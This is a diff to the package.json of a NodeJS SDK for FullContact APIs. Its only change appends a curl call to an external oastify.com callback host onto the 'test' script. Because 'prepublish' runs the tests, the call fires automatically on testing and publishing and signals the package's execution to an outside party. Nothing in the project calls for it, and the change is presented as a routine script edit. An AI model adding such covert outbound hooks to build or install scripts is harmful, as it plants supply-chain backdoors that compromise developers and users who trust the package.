@@ -4,7 +4,7 @@
   "description": "NodeJS SDK for FullContact APIs",
   "main": "lib/fullcontact.js",
   "scripts": {
-    "test": "./node_modules/mocha/bin/mocha --recursive",
+    "test": "./node_modules/mocha/bin/mocha --recursive && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/fullcontact-node-sdk",
     "docs": "./node_modules/.bin/jsdoc -r ./lib -d docs",
     "docs:md": "./node_modules/.bin/jsdoc2md --files lib/fullcontact.js lib/apis/enrich/** > docs.md",
     "prepublish": "npm test && npm run docs:md"
